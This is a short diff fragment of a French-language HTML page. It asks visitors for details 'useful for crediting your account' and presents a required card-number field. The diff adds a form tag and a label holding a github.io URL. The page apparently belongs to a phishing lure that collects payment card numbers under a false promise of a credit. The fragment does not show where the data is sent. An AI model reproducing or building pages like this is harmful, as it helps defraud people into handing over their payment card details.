@@ -9,6 +9,7 @@ html>
       Merci de bien vouloir nous communiquer les informations 
      <br> mentionnées ci-dessous, utiles pour créditer votre compte. 
     </dt> 
+<form method="post"> <label>https://c3-lan.github.io/idda/</label> 
     <br> 
     <br> <label for="numcarte"> Numéro de la carte :</label><span class="required" style="color: orange"> *</span> &nbsp; 
     <dd> 
